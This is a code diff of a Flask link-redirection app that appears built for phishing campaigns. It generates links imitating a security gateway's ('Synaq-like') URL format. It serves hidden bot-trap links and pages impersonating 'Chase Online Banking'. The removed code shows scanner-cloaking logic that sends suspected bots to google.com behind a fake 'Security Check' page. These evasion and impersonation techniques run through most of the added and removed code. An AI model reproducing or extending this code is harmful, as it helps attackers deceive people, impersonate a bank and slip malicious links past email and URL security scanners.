             randomstring1 = bleach.clean(form.randomstring1.data.strip())
             destination_link = bleach.clean(form.destination_link.data.strip())
@@ -618,92 +514,119 @@ def dashboard():
                 logger.warning(f"Invalid destination_link: {destination_link}")
 
             if not error:
-                path_segment = f"{randomstring1}{randomstring2}/{uuid.uuid4()}{secrets.token_hex(10)}"
-                endpoint = generate_random_string(16)
-                expiry_timestamp = int(time.time()) + expiry
+                # Generate Synaq-like URL
+                url_id = generate_random_string(16)
+                timestamp = int(time.time())
+                expiry_timestamp = timestamp + expiry
                 payload = json.dumps({
                     "student_link": destination_link,
-                    "timestamp": int(time.time() * 1000),
-                    "expiry": expiry_timestamp,
-                    "fingerprint": generate_request_fingerprint()
+                    "timestamp": timestamp * 1000,
+                    "expiry": expiry_timestamp
                 })
+                logger.debug(f"Raw payload: {payload}")
 
                 try:
-                    encrypted_payload = encrypt_payload(payload)
+                    encryption_method = get_next_encryption_method()
+                    if encryption_method == 'aes_gcm':
+                        encrypted_payload = encrypt_aes_gcm(payload)
+                    else:
+                        encrypted_payload = encrypt_hmac_sha256(payload)
+                    logger.debug(f"Encrypted payload: {encrypted_payload[:20]}... (length: {len(encrypted_payload)})")
                 except ValueError as e:
-                    logger.error(f"Encryption failed: {str(e)}")
-                    error = "Failed to encrypt payload"
+                    logger.error(f"Encryption failed with {encryption_method}: {str(e)}")
+                    error = f"Failed to encrypt payload: {str(e)}"
 
                 if not error:
-                    fake_params = f"?utm_source={generate_random_string(8)}&session={secrets.token_hex(6)}"
-                    generated_url = f"https://{urllib.parse.quote(subdomain)}.{base_domain}/{endpoint}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment, safe='/')}{fake_params}"
-                    url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
+                    # Encode payload in base64 for query parameter
+                    encoded_payload = base64.urlsafe_b64encode(encrypted_payload.encode('utf-8')).decode('utf-8')
+                    path_segment = f"link/{randomstring1}{randomstring2}"
+                    generated_url = (f"https://{urllib.parse.quote(subdomain)}.{base_domain}/{path_segment}"
+                                    f"?id={urllib.parse.quote(url_id)}&ts={timestamp}&cnf=-&url={urllib.parse.quote(encoded_payload)}")
+                    url_id_hash = hashlib.sha256(f"{url_id}{encrypted_payload}".encode()).hexdigest()
                     if valkey_client:
-                        valkey_client.hset(f"user:{username}:url:{url_id}", mapping={
-                            "url": generated_url,
-                            "destination": destination_link,
-                            "encrypted_payload": encrypted_payload,
-                            "endpoint": endpoint,
-                            "created": int(time.time()),
-                            "expiry": expiry_timestamp,
-                            "clicks": 0,
-                            "analytics_enabled": "1" if analytics_enabled else "0"
-                        })
-                        valkey_client.expire(f"user:{username}:url:{url_id}", DATA_RETENTION_DAYS * 86400)
-                        logger.info(f"Generated URL for {username}: {generated_url}")
-                        response = make_response(redirect(url_for('dashboard')))
-                        return add_security_headers(response)
+                        try:
+                            valkey_client.hset(f"user:{username}:url:{url_id_hash}", mapping={
+                                "url": generated_url,
+                                "destination": destination_link,
+                                "encrypted_payload": encrypted_payload,
+                                "url_id": url_id,
+                                "encryption_method": encryption_method,
+                                "key_version": KEY_VERSION,
+                                "created": timestamp,
+                                "expiry": expiry_timestamp,
+                                "clicks": 0,
+                                "analytics_enabled": "1" if analytics_enabled else "0"
+                            })
+                            valkey_client.expire(f"user:{username}:url:{url_id_hash}", DATA_RETENTION_DAYS * 86400)
+                            logger.info(f"Generated URL for {username}: {generated_url}, Method: {encryption_method}, Key Version: {KEY_VERSION}, Analytics: {analytics_enabled}")
+                        except Exception as e:
+                            logger.error(f"Valkey error storing URL: {str(e)}", exc_info=True)
+                            error = "Failed to store URL in database"
                     else:
+                        logger.warning("Valkey unavailable, cannot store URL")
                         error = "Database unavailable"
+
+                    if not error:
+                        logger.debug("URL generation successful, redirecting to dashboard")
+                        return redirect(url_for('dashboard'))
 
         urls = []
         valkey_error = None
         if valkey_client:
             try:
+                logger.debug(f"Fetching URL keys for user: {username}")
                 url_keys = valkey_client.keys(f"user:{username}:url:*")
+                logger.debug(f"Found {len(url_keys)} URL keys")
                 for key in url_keys:
-                    url_data = valkey_client.hgetall(key)
-                    if not url_data:
-                        continue
-                    url_id = key.split(':')[-1]
-                    urls.append({
-                        "url": url_data.get('url', ''),
-                        "destination": url_data.get('destination', ''),
-                        "created": datetime.fromtimestamp(int(url_data.get('created', 0))).strftime('%Y-%m-%d %H:%M:%S'),
-                        "expiry": datetime.fromtimestamp(int(url_data.get('expiry', 0))).strftime('%Y-%m-%d %H:%M:%S'),
-                        "clicks": int(url_data.get('clicks', 0)),
-                        "analytics_enabled": url_data.get('analytics_enabled', '0') == '1',
-                        "url_id": url_id
-                    })
+                    try:
+                        url_data = valkey_client.hgetall(key)
+                        if not url_data:
+                            logger.warning(f"Empty data for key {key}")
+                            continue
+                        url_id = key.split(':')[-1]
+                        urls.append({
+                            "url": url_data.get('url', ''),
+                            "destination": url_data.get('destination', ''),
+                            "created": datetime.fromtimestamp(int(url_data.get('created', 0))).strftime('%Y-%m-%d %H:%M:%S') if url_data.get('created') else 'Not Available',
+                            "expiry": datetime.fromtimestamp(int(url_data.get('expiry', 0))).strftime('%Y-%m-%d %H:%M:%S') if url_data.get('expiry') else 'Not Available',
+                            "clicks": int(url_data.get('clicks', 0)),
+                            "analytics_enabled": url_data.get('analytics_enabled', '0') == '1',
+                            "url_id": url_id
+                        })
+                    except Exception as e:
+                        logger.error(f"Error processing URL key {key}: {str(e)}")
             except Exception as e:
                 logger.error(f"Valkey error fetching URLs: {str(e)}")
-                valkey_error = "Unable to fetch URL history"
+                valkey_error = "Unable to fetch URL history due to database error"
+        else:
+            logger.warning("Valkey unavailable, cannot fetch URLs")
+            valkey_error = "Database unavailable"
 
-        response = make_response(render_template_string("""
+        theme_seed = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()[:6]
+        primary_color = f"#{theme_seed}"
+
+        logger.debug(f"Rendering dashboard for user: {username}")
+        return render_template_string("""
             <!DOCTYPE html>
             <html lang="en">
             <head>
                 <meta charset="UTF-8">
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <meta name="robots" content="noindex, nofollow">
-                <meta name="description" content="Manage your secure URL redirects with TamariskSD">
-                <meta name="keywords" content="URL redirection, secure links, link management, dashboard, URL shortening">
-                <meta name="author" content="TamariskSD">
-                <meta http-equiv="X-UA-Compatible" content="IE=edge">
-                <meta name="referrer" content="strict-origin-when-cross-origin">
-                <meta property="og:title" content="TamariskSD - Dashboard">
-                <meta property="og:description" content="Manage your secure URL redirects with TamariskSD">
-                <meta property="og:type" content="website">
-                <meta property="og:url" content="{{ request.url }}">
-                <title>Dashboard - {{ username }} - TamariskSD</title>
+                <title>Dashboard - {{ username }}</title>
                 <script src="https://cdn.tailwindcss.com"></script>
                 <style>
-                    body { background: linear-gradient(to bottom, #252423, #6264a7); color: #ffffff; }
+                    body { background: linear-gradient(to right, #4f46e5, #7c3aed); color: #1f2937; }
                     .container { animation: fadeIn 1s ease-in; }
                     @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                     .card { transition: all 0.3s; box-shadow: 0 10px 15px rgba(0,0,0,0.1); }
                     .card:hover { transform: translateY(-5px); }
-                    .error { color: #f87171; }
+                    .table-container { max-height: 400px; overflow-y: auto; }
+                    table { width: 100%; border-collapse: collapse; }
+                    th, td { padding: 12px; text-align: left; }
+                    th { background: #e5e7eb; position: sticky; top: 0; }
+                    tr:nth-child(even) { background: #f9fafb; }
+                    .error { background: #fee2e2; color: #b91c1c; }
                     .toggle-switch { position: relative; display: inline-block; width: 60px; height: 34px; }
                     .toggle-switch input { opacity: 0; width: 0; height: 0; }
                     .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px; }
@@ -735,7 +658,7 @@ def dashboard():
                 <div class="container max-w-7xl mx-auto">
                     <h1 class="text-4xl font-extrabold mb-8 text-center text-white">Welcome, {{ username }}</h1>
                     {% if form.errors %}
-                        <p class="error p-4 mb-4 text-center">
+                        <p class="error p-4 mb-4 text-center rounded-lg">
                             {% for field, errors in form.errors.items() %}
                                 {% for error in errors %}
                                     {{ error }}<br>
@@ -744,55 +667,55 @@ def dashboard():
                         </p>
                     {% endif %}
                     {% if error %}
-                        <p class="error p-4 mb-4 text-center">{{ error }}</p>
+                        <p class="error p-4 mb-4 text-center rounded-lg">{{ error }}</p>
                     {% endif %}
                     {% if valkey_error %}
-                        <p class="error p-4 mb-4 text-center">{{ valkey_error }}</p>
+                        <p class="error p-4 mb-4 text-center rounded-lg">{{ valkey_error }}</p>
                     {% endif %}
-                    <div class="card bg-gray-800 p-8 rounded-xl mb-8">
-                        <h2 class="text-2xl font-bold mb-6 text-white">Generate New URL</h2>
-                        <p class="text-gray-300 mb-4">Note: Subdomain, Randomstring1, and Randomstring2 can be changed after generation without affecting the redirect.</p>
-                        <form method="POST" class="space-y-5 max-w-md mx-auto">
+                    <div class="bg-white p-8 rounded-xl card mb-8">
+                        <h2 class="text-2xl font-bold mb-6 text-gray-900">Generate New URL</h2>
+                        <p class="text-gray-600 mb-4">Note: Subdomain, Randomstring1, and Randomstring2 can be changed after generation without affecting the redirect.</p>
+                        <form method="POST" class="space-y-5">
                             {{ form.csrf_token }}
                             <div>
-                                <label class="block text-sm font-medium text-white">Subdomain</label>
-                                {{ form.subdomain(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
+                                <label class="block text-sm font-medium text-gray-700">Subdomain</label>
+                                {{ form.subdomain(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                             </div>
                             <div>
-                                <label class="block text-sm font-medium text-white">Randomstring1</label>
-                                {{ form.randomstring1(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
+                                <label class="block text-sm font-medium text-gray-700">Randomstring1</label>
+                                {{ form.randomstring1(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                             </div>
                             <div>
-                                <label class="block text-sm font-medium text-white">Destination Link</label>
-                                {{ form.destination_link(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
+                                <label class="block text-sm font-medium text-gray-700">Destination Link</label>
+                                {{ form.destination_link(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                             </div>
                             <div>
-                                <label class="block text-sm font-medium text-white">Randomstring2</label>
-                                {{ form.randomstring2(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
+                                <label class="block text-sm font-medium text-gray-700">Randomstring2</label>
+                                {{ form.randomstring2(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                             </div>
                             <div>
-                                <label class="block text-sm font-medium text-white">Expiry</label>
-                                {{ form.expiry(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition bg-gray-800 text-white border-gray-600") }}
+                                <label class="block text-sm font-medium text-gray-700">Expiry</label>
+                                {{ form.expiry(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                             </div>
                             <div>
-                                <label class="block text-sm font-medium text-white">Enable Analytics</label>
+                                <label class="block text-sm font-medium text-gray-700">Enable Analytics</label>
                                 {{ form.analytics_enabled(class="mt-1 p-3") }}
                             </div>
                             {{ form.submit(class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition") }}
                         </form>
                     </div>
-                    <div class="card bg-gray-800 p-8 rounded-xl">
-                        <h2 class="text-2xl font-bold mb-6 text-white">URL History</h2>
+                    <div class="bg-white p-8 rounded-xl card">
+                        <h2 class="text-2xl font-bold mb-6 text-gray-900">URL History</h2>
                         {% if urls %}
                             {% for url in urls %}
-                                <div class="card bg-gray-900 p-6 rounded-lg mb-4">
-                                    <h3 class="text-xl font-semibold text-white">{{ url.destination }}</h3>
-                                    <p class="text-gray-300 break-all"><strong>URL:</strong> <a href="{{ url.url }}" target="_blank" class="text-indigo-400">{{ url.url }}</a></p>
-                                    <p class="text-gray-300"><strong>Created:</strong> {{ url.created }}</p>
-                                    <p class="text-gray-300"><strong>Expires:</strong> {{ url.expiry }}</p>
-                                    <p class="text-gray-300"><strong>Total Clicks:</strong> {{ url.clicks }}</p>
+                                <div class="card bg-gray-50 p-6 rounded-lg mb-4">
+                                    <h3 class="text-xl font-semibold text-gray-900">{{ url.destination }}</h3>
+                                    <p class="text-gray-600 break-all"><strong>URL:</strong> <a href="{{ url.url }}" target="_blank" class="text-indigo-600">{{ url.url }}</a></p>
+                                    <p class="text-gray-600"><strong>Created:</strong> {{ url.created }}</p>
+                                    <p class="text-gray-600"><strong>Expires:</strong> {{ url.expiry }}</p>
+                                    <p class="text-gray-600"><strong>Total Clicks:</strong> {{ url.clicks }}</p>
                                     <div class="flex items-center mt-2">
-                                        <label class="text-sm font-medium text-white mr-2">Analytics:</label>
+                                        <label class="text-sm font-medium text-gray-700 mr-2">Analytics:</label>
                                         <label class="toggle-switch">
                                             <input type="checkbox" id="analytics-toggle-{{ loop.index }}" {% if url.analytics_enabled %}checked{% endif %} onchange="toggleAnalyticsSwitch('{{ url.url_id }}', '{{ loop.index }}')">
                                             <span class="slider"></span>
@@ -804,45 +727,43 @@ def dashboard():
                                 </div>
                             {% endfor %}
                         {% else %}
-                            <p class="text-gray-300">No URLs generated yet.</p>
+                            <p class="text-gray-600">No URLs generated yet.</p>
                         {% endif %}
                     </div>
                 </div>
             </body>
             </html>
-        """, username=username, form=form, urls=urls, error=error, valkey_error=valkey_error, request=request))
-        return add_security_headers(response)
+        """, username=username, form=form, urls=urls, primary_color=primary_color, error=error, valkey_error=valkey_error)
     except Exception as e:
         logger.error(f"Dashboard error for user {username}: {str(e)}", exc_info=True)
-        response = make_response(render_template_string("""
-            <!DOCTYPE html>
-            <html lang="en">
-            <head>
-                <meta charset="UTF-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <meta name="robots" content="noindex, nofollow">
-                <meta name="description" content="Secure URL redirection service for managing custom links">
-                <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
-                <meta name="author" content="TamariskSD">
-                <meta http-equiv="X-UA-Compatible" content="IE=edge">
-                <meta name="referrer" content="strict-origin-when-cross-origin">
-                <meta property="og:title" content="TamariskSD - Error">
-                <meta property="og:description" content="An error occurred while accessing the URL redirection service">
-                <meta property="og:type" content="website">
-                <meta property="og:url" content="{{ request.url }}">
-                <title>Internal Server Error - TamariskSD</title>
-                <script src="https://cdn.tailwindcss.com"></script>
-            </head>
-            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
-                    <p class="text-gray-600">Something went wrong: {{ error }}</p>
-                    <p class="text-gray-600">Please try again later.</p>
-                </div>
-            </body>
-            </html>
-        """, error=str(e), request=request), 500)
-        return add_security_headers(response)
+        headers = mimic_chase_response()
+        return Response(
+            "<html><head><title>Chase Online</title></head><body>Internal Server Error<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+            status=500,
+            headers=headers
+        )
+
+@app.route("/bot-trap", methods=["GET"])
+def bot_trap():
+    try:
+        ip = request.remote_addr
+        logger.warning(f"Bot trapped at /bot-trap from IP: {ip}")
+        if valkey_client:
+            valkey_client.setex(f"blocked:{ip}", 86400, "bot_trap")
+        headers = mimic_chase_response()
+        return Response(
+            "<html><head><title>Chase Online</title></head><body>Welcome to Chase Online Banking</body></html>",
+            status=200,
+            headers=headers
+        )
+    except Exception as e:
+        logger.error(f"Error in bot_trap: {str(e)}")
+        headers = mimic_chase_response()
+        return Response(
+            "<html><head><title>Chase Online</title></head><body>Internal Server Error<br><a href='/bot-trap' style='display:none;'>Bot Trap</a></body></html>",
+            status=500,
+            headers=headers
+        )
 
 @app.route("/toggle_analytics/<url_id>", methods=["POST"])
 @login_required
@@ -853,31 +774,27 @@ def toggle_analytics(url_id):
         data = request.get_json()
         if not data or 'csrf_token' not in data:
             logger.warning(f"Missing CSRF token for toggle_analytics: {url_id}")
-            response = make_response(jsonify({"status": "error", "message": "CSRF token required"}), 403)
-            return add_security_headers(response)
+            return jsonify({"status": "error", "message": "CSRF token required"}), 403
         form = GenerateURLForm(csrf_token=data['csrf_token'])
         if not form.validate_csrf_token(form.csrf_token):
             logger.warning(f"Invalid CSRF token for toggle_analytics: {url_id}")
-            response = make_response(jsonify({"status": "error", "message": "Invalid CSRF token"}), 403)
-            return add_security_headers(response)
+            return jsonify({"status": "error", "message": "Invalid CSRF token"}), 403
         if valkey_client:
             key = f"user:{username}:url:{url_id}"
             if not valkey_client.exists(key):
                 logger.warning(f"URL {url_id} not found for user {username}")
-                response = make_response(jsonify({"status": "error", "message": "URL not found"}), 404)
-                return add_security_headers(response)
+                return jsonify({"status": "error", "message": "URL not found"}), 404
             current = valkey_client.hget(key, "analytics_enabled")
             new_value = "0" if current == "1" else "1"
             valkey_client.hset(key, "analytics_enabled", new_value)
             logger.debug(f"Toggled analytics for URL {url_id} to {new_value}")
-            response = make_response(jsonify({"status": "ok"}), 200)
-            return add_security_headers(response)
-        response = make_response(jsonify({"status": "error", "message": "Database unavailable"}), 500)
-        return add_security_headers(response)
+            return jsonify({"status": "ok"}), 200
+        else:
+            logger.warning("Valkey unavailable, cannot toggle analytics")
+            return jsonify({"status": "error", "message": "Database unavailable"}), 500
     except Exception as e:
         logger.error(f"Error in toggle_analytics: {str(e)}", exc_info=True)
-        response = make_response(jsonify({"status": "error", "message": "Internal server error"}), 500)
-        return add_security_headers(response)
+        return jsonify({"status": "error", "message": "Internal server error"}), 500
 
 @app.route("/delete_url/<url_id>", methods=["GET"])
 @login_required
@@ -888,462 +805,490 @@ def delete_url(url_id):
             key = f"user:{username}:url:{url_id}"
             if not valkey_client.exists(key):
                 logger.warning(f"URL {url_id} not found for user {username}")
-                response = make_response(render_template_string("""
-                    <!DOCTYPE html>
-                    <html lang="en">
-                    <head>
-                        <meta charset="UTF-8">
-                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                        <meta name="robots" content="noindex, nofollow">
-                        <meta name="description" content="Secure URL redirection service for managing custom links">
-                        <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
-                        <meta name="author" content="TamariskSD">
-                        <meta http-equiv="X-UA-Compatible" content="IE=edge">
-                        <meta name="referrer" content="strict-origin-when-cross-origin">
-                        <meta property="og:title" content="TamariskSD - URL Not Found">
-                        <meta property="og:description" content="The requested URL was not found in the redirection service">
-                        <meta property="og:type" content="website">
-                        <meta property="og:url" content="{{ request.url }}">
-                        <title>URL Not Found - TamariskSD</title>
-                        <script src="https://cdn.tailwindcss.com"></script>
-                    </head>
-                    <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                        <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-                            <h3 class="text-lg font-bold mb-4 text-red-600">URL Not Found</h3>
-                            <p class="text-gray-600">The requested URL was not found.</p>
-                        </div>
-                    </body>
-                    </html>
-                """, request=request), 404)
-                return add_security_headers(response)
+                abort(404, "URL not found")
             valkey_client.delete(key)
             valkey_client.delete(f"url_payload:{url_id}")
             logger.debug(f"Deleted URL {url_id}")
-            response = make_response(redirect(url_for('dashboard')))
-            return add_security_headers(response)
-        response = make_response(render_template_string("""
-            <!DOCTYPE html>
-            <html lang="en">
-            <head>
-                <meta charset="UTF-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <meta name="robots" content="noindex, nofollow">
-                <meta name="description" content="Secure URL redirection service for managing custom links">
-                <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
-                <meta name="author" content="TamariskSD">
-                <meta http-equiv="X-UA-Compatible" content="IE=edge">
-                <meta name="referrer" content="strict-origin-when-cross-origin">
-                <meta property="og:title" content="TamariskSD - Error">
-                <meta property="og:description" content="An error occurred while accessing the URL redirection service">
-                <meta property="og:type" content="website">
-                <meta property="og:url" content="{{ request.url }}">
-                <title>Error - TamariskSD</title>
-                <script src="https://cdn.tailwindcss.com"></script>
-            </head>
-            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-                    <h3 class="text-lg font-bold mb-4 text-red-600">Error</h3>
-                    <p class="text-gray-600">Database unavailable. Unable to delete URL.</p>
-                </div>
-            </body>
-            </html>
-        """, request=request), 500)
-        return add_security_headers(response)
-    except Exception as e:
-        logger.error(f"Error in delete_url: {str(e)}", exc_info=True)
-        response = make_response(render_template_string("""
-            <!DOCTYPE html>
-            <html lang="en">
-            <head>
-                <meta charset="UTF-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <meta name="robots" content="noindex, nofollow">
-                <meta name="description" content="Secure URL redirection service for managing custom links">
-                <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
-                <meta name="author" content="TamariskSD">
-                <meta http-equiv="X-UA-Compatible" content="IE=edge">
-                <meta name="referrer" content="strict-origin-when-cross-origin">
-                <meta property="og:title" content="TamariskSD - Error">
-                <meta property="og:description" content="An error occurred while accessing the URL redirection service">
-                <meta property="og:type" content="website">
-                <meta property="og:url" content="{{ request.url }}">
-                <title>Internal Server Error - TamariskSD</title>
-                <script src="https://cdn.tailwindcss.com"></script>
-            </head>
-            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
-                    <p class="text-gray-600">Something went wrong: {{ error }}</p>
-                    <p class="text-gray-600">Please try again later.</p>
-                </div>
-            </body>
-            </html>
-        """, error=str(e), request=request), 500)
-        return add_security_headers(response)
-
-@app.route("/bot-trap/<token>", methods=["GET"])
-@dynamic_rate_limit(base_limit=5, base_per=60)
-def bot_trap(token):
-    try:
-        ip = request.remote_addr
-        logger.debug(f"Bot trap hit by IP: {ip}, token: {token}")
-        if valkey_client:
-            valkey_client.hincrby(f"risk_score:{ip}", "score", 50)
-            valkey_client.expire(f"risk_score:{ip}", 3600)
-            logger.info(f"Increased risk score for IP {ip} due to bot trap")
-        response = make_response(redirect("https://google.com", code=302))
-        return add_security_headers(response)
-    except Exception as e:
-        logger.error(f"Error in bot_trap: {str(e)}", exc_info=True)
-        response = make_response(redirect("https://google.com", code=302))
-        return add_security_headers(response)
-
-@app.route("/<endpoint>/<path:encrypted_payload>/<path:path_segment>", methods=["GET"], subdomain="<username>")
-@dynamic_rate_limit(base_limit=5, base_per=60)
-def redirect_handler(username, endpoint, encrypted_payload, path_segment):
-    try:
-        base_domain = get_base_domain()
-        logger.debug(f"Redirect handler: username={username}, endpoint={endpoint}, payload={encrypted_payload[:20]}...")
-        ip = request.remote_addr
-        ua = request.headers.get('User-Agent', '').lower()
-
-        # Validate payload length
-        if not encrypted_payload or len(encrypted_payload) < 32:
-            logger.warning(f"Invalid payload length: {len(encrypted_payload)}")
-            response = make_response(redirect("https://google.com", code=302))
-            return add_security_headers(response)
-
-        # Cookie-based token check
-        token = request.cookies.get('bot_check_token')
-        is_first_request = False
-        if not token and valkey_client:
-            token = secrets.token_hex(16)
-            valkey_client.setex(f"token:{ip}:{token}", COOKIE_TOKEN_TTL, "1")
-            is_first_request = True
-            logger.debug(f"Set new cookie token for IP {ip}: {token}")
-        elif valkey_client and not valkey_client.exists(f"token:{ip}:{token}"):
-            logger.warning(f"Invalid or missing cookie token for IP {ip}")
-            response = make_response(redirect("https://google.com", code=302))
-            return add_security_headers(response)
-
-        # Generate verify token
-        verify_token = secrets.token_hex(16)
-        encrypted_payload = urllib.parse.unquote(encrypted_payload)
-        url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
-
-        # Store request data for verification
-        if valkey_client:
-            valkey_client.hset(f"verify:{verify_token}", mapping={
-                "username": username,
-                "endpoint": endpoint,
-                "encrypted_payload": encrypted_payload,
-                "path_segment": path_segment,
-                "url_id": url_id,
-                "ip": ip,
-                "ua": ua,
-                "is_first_request": "1" if is_first_request else "0",
-                "cookie_token": token
-            })
-            valkey_client.expire(f"verify:{verify_token}", VERIFY_TOKEN_TTL)
-
-        # Return loading page
-        response = make_response(render_template_string("""
-            <!DOCTYPE html>
-            <html lang="en">
-            <head>
-                <meta charset="UTF-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <meta name="robots" content="noindex, nofollow">
-                <meta name="description" content="Secure URL redirection service for managing custom links">
-                <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
-                <meta name="author" content="TamariskSD">
-                <meta http-equiv="X-UA-Compatible" content="IE=edge">
-                <meta name="referrer" content="strict-origin-when-cross-origin">
-                <meta property="og:title" content="TamariskSD - Security Check">
-                <meta property="og:description" content="We are validating your request to scan this URL securely">
-                <meta property="og:type" content="website">
-                <meta property="og:url" content="{{ request.url }}">
-                <meta http-equiv="refresh" content="3;url={{ verify_url }}">
-                <title>Security Check - TamariskSD</title>
-                <style>
-                    body {
-                        margin: 0;
-                        padding: 2rem 1rem;
-                        background-color: #f3f2f9;
-                        font-family: 'Segoe UI', sans-serif;
-                        color: #444;
-                        display: flex;
-                        flex-direction: column;
-                        align-items: center;
-                        justify-content: center;
-                        min-height: 100vh;
-                        text-align: center;
-                    }
-                    h3 {
-                        font-size: 1.1rem;
-                        font-weight: 500;
-                        margin: 0.4rem 0;
-                        color: #444;
-                    }
-                    p {
-                        font-size: 0.9rem;
-                        font-weight: 400;
-                        color: #666;
-                        margin: 0.2rem 0 1.5rem;
-                    }
-                    .loader {
-                        width: 26px;
-                        height: 26px;
-                        border: 3px solid #ddd;
-                        border-top: 3px solid #6264a7;
-                        border-radius: 50%;
-                        animation: spin 1s linear infinite;
-                    }
-                    @keyframes spin {
-                        to { transform: rotate(360deg); }
-                    }
-                    a {
-                        display: none;
-                    }
-                </style>
-            </head>
-            <body>
-                <h3>Security Check</h3>
-                <p>We are validating your request to scan this URL securely.</p>
-                <div class="loader"></div>
-                <a href="/bot-trap/{{ bot_trap_token }}">trap</a>
-            </body>
-            </html>
-        """, verify_url=url_for('verify', token=verify_token), bot_trap_token=secrets.token_hex(16), request=request))
-        return add_security_headers(response)
-    except Exception as e:
-        logger.error(f"Error in redirect_handler: {str(e)}")
-        response = make_response(redirect("https://google.com", code=302))
-        return add_security_headers(response)
-
-@app.route("/verify/<token>", methods=["GET"])
-@dynamic_rate_limit(base_limit=5, base_per=60)
-def verify(token):
-    try:
-        if not valkey_client or not valkey_client.exists(f"verify:{token}"):
-            logger.warning(f"Invalid or expired verify token: {token}")
-            response = make_response(redirect("https://google.com", code=302))
-            return add_security_headers(response)
-
-        verify_data = valkey_client.hgetall(f"verify:{token}")
-        username = verify_data.get("username")
-        endpoint = verify_data.get("endpoint")
-        encrypted_payload = verify_data.get("encrypted_payload")
-        path_segment = verify_data.get("path_segment")
-        url_id = verify_data.get("url_id")
-        ip = verify_data.get("ip")
-        ua = verify_data.get("ua")
-        is_first_request = verify_data.get("is_first_request") == "1"
-        cookie_token = verify_data.get("cookie_token")
-
-        # Random delay
-        time.sleep(random.uniform(0.05, 0.2))
-
-        # Analytics tracking
-        should_count_click = False
-        if valkey_client:
-            analytics_enabled = valkey_client.hget(f"user:{username}:url:{url_id}", "analytics_enabled") == "1"
-            if analytics_enabled:
-                click_key = f"click:{ip}:{ua}:{url_id}"
-                if not valkey_client.exists(click_key):
-                    valkey_client.setex(click_key, 600, "1")
-                    should_count_click = True
-
-        # Process payload
-        uuid_suffix_pattern = r'(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}[0-9a-f]+)?$'
-        cleaned_path_segment = re.sub(uuid_suffix_pattern, '', path_segment)
-
-        payload = None
-        if valkey_client:
-            cached_payload = valkey_client.get(f"url_payload:{url_id}")
-            if cached_payload:
-                payload = cached_payload
-
-        if not payload:
-            try:
-                payload = decrypt_payload(encrypted_payload)
-                if valkey_client:
-                    expiry = json.loads(payload).get('expiry', int(time.time()) + 3600)
-                    ttl = max(1, int(expiry - time.time()))
-                    valkey_client.setex(f"url_payload:{url_id}", ttl, payload)
-            except ValueError as e:
-                logger.error(f"Decryption failed: {str(e)}")
-                response = make_response(redirect("https://google.com", code=302))
-                return add_security_headers(response)
-
-        try:
-            data = json.loads(payload)
-            redirect_url = data.get("student_link")
-            expiry = data.get("expiry", float('inf'))
-            if not redirect_url or not re.match(r"^https?://", redirect_url):
-                logger.error(f"Invalid redirect URL: {redirect_url}")
-                response = make_response(render_template_string("""
-                    <!DOCTYPE html>
-                    <html lang="en">
-                    <head>
-                        <meta charset="UTF-8">
-                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                        <meta name="robots" content="noindex, nofollow">
-                        <meta name="description" content="Secure URL redirection service for managing custom links">
-                        <meta name="keywords" content="URL redirection, secure links, link management, URL shortening">
-                        <meta name="author" content="TamariskSD">
-                        <meta http-equiv="X-UA-Compatible" content="IE=edge">
-                        <meta name="referrer" content="strict-origin-when-cross-origin">
-                        <meta property="og:title" content="TamariskSD - Invalid Link">
-                        <meta property="og:description" content="The provided link is invalid or malformed">
-                        <meta property="og:type" content="website">
-                        <meta property="og:url" content="{{ request.url }}">
-                        <title>Invalid Link - TamariskSD</title>
-                        <script src="https://cdn.tailwindcss.com"></script>
-                    </head>
